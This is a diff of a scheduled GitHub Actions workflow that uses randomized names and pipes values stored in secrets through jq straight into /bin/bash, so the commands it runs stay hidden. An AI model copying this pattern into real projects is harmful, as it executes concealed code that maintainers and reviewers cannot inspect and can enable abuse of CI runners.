@@ -3,8 +3,7 @@ name: mnajx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 5/6 * * *'
-
+    - cron: '10 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,16 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: mnajx
         env:
-          wsatz26772: ${{ secrets.wsatz26772 }}
+          nfeut4334: ${{ secrets.nfeut4334 }}
         run: |
-          echo $wsatz26772 | jq -r .n24151 | /bin/bash
-          echo $qy07 | jq -r .szyq84432 | /bin/bash
-          echo $v7573 | jq -r .u2 | /bin/bash
-          echo $yd4 | jq -r .jvl178 | /bin/bash
-          echo $snm1 | jq -r .ox6894 | /bin/bash
-          echo $nfvwp57 | jq -r .mo947 | /bin/bash
-          echo $jo331 | jq -r .lz5 | /bin/bash
-          echo $ex386 | jq -r .wxzry6 | /bin/bash
-          echo $ib0 | jq -r .btvme9 | /bin/bash
-          echo $pfsmj4632 | jq -r .yoy585 | /bin/bash
+          echo $nfeut4334 | jq -r .e5331 | /bin/bash
+          echo $pynsh3074 | jq -r .bo5229 | /bin/bash
+          echo $rqylz8297 | jq -r .b47618 | /bin/bash
+          echo $tjs0 | jq -r .ycsd157 | /bin/bash
+          echo $nc0865 | jq -r .aucjd30 | /bin/bash
+          echo $qdfh565 | jq -r .i9 | /bin/bash
+          echo $rt6289 | jq -r .tzoqc07 | /bin/bash
+          echo $ho248 | jq -r .kmw15 | /bin/bash
+          echo $uxf09342 | jq -r .tk24413 | /bin/bash
+          echo $qpu01112 | jq -r .jqvge9496 | /bin/bash
+          echo $ym538 | jq -r .jbaub23 | /bin/bash
 
